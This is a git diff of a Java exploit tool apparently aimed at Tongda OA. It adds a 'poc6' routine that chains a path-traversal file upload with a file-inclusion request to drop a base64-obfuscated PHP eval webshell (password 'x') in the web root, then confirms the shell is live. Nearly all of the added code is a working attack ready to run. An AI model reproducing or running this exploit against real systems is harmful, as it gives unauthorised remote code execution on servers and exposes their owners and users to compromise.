@@ -1,5 +1,6 @@
 package com.xinyu.poc;
 
+import com.sun.org.apache.xpath.internal.operations.Bool;
 import com.xinyu.tools.Other;
 import com.xinyu.tools.Request;
 import com.xinyu.tools.Response;
@@ -18,6 +19,8 @@ public class GetShell {
             return poc2(url, cookie);
         } else if (poc.equals("poc3")) {
             return poc3(url, cookie);
+        } else if (poc.equals("poc6")) {
+            return poc6(url, cookie);
         } else {
             System.out.println("未知的POC编号");
             return null;
@@ -134,23 +137,6 @@ public class GetShell {
     }
 
 
-//    /**
-//     * 生成随机文件名
-//     *
-//     * @return 返回一个7位数的随机字符串
-//     */
-//    public static String getRandomFileName() {
-//        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-//        Random random = new Random();
-//        StringBuffer sb = new StringBuffer();
-//        for (int i = 0; i < 7; i++) {
-//            int number = random.nextInt(62);
-//            sb.append(str.charAt(number));
-//        }
-//        return sb.toString();
-//    }
-
-
     /**
      * 这是一个前台文件上传,需要配合文件包含
      *
@@ -237,5 +223,58 @@ public class GetShell {
         //访问上传文件是否存在
         Response response = Request.get(url + "/_" + random_filename + ".php");
     }
+
+
+    /**
+     * 该POC v11.7版本 可用
+     * 文件上传(后台) + 文件包含(后台)
+     * 参考文章: https://lorexxar.cn/2021/03/03/tongda11-7rce/
+     * @param url
+     * @param cookie
+     * @return
+     */
+    public static String poc6(String url, String cookie) {
+        String shell_url = null; //记录WebShell地址及密码
+        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
+
+
+        //1.文件上传
+        StringBuilder tempParams = new StringBuilder(); //创建StringBuilder对象
+        tempParams.append("Content-Disposition: form-data; name=\"FILE1\"; filename=\"" + random_filename + ".txt\"");
+        tempParams.append("\r\n");
+        tempParams.append("\r\n");
+        tempParams.append("<?php file_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/" + random_filename + ".php\",base64_decode(\"PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJ4Il07ZXZhbCgiIi4kYik7Pz4=\")." + random_filename + ");?><?php unlink(__FILE__);?>");
+        tempParams.append("\r\n");
+        tempParams.append("--" + "********");
+        tempParams.append("\r\n");
+        Request.upload(url + "/general/reportshop/utils/upload.php?action=upload&newid=/../../../../general/reportshop/workshop/report/attachment-remark/", tempParams, cookie);
+
+
+        //2.文件包含
+        Request.get(url + "/ispirit/interface/gateway.php?json={}&url=general/reportshop/workshop/report/attachment-remark/}_" + random_filename + ".txt", cookie);
+        System.out.println(url + "/ispirit/interface/gateway.php?json={}&url=general/reportshop/workshop/report/attachment-remark/}_" + random_filename + ".txt");
+
+
+        shell_url = detectionShell(url + "/" + random_filename + ".php", random_filename);
+        return shell_url;
+
+
+    }
+
+
+    /**
+     * 验证shell是否存在
+     */
+    private static String detectionShell(String shell_url, String random_filename) {
+        //验证上传文件是否存在
+        Response response = Request.get(shell_url);
+        if (response.getText().contains(random_filename)) {
+            shell_url += "\n密码:x";
+        } else {
+            shell_url = null;
+        }
+        return shell_url;
+    }
+
 
 }
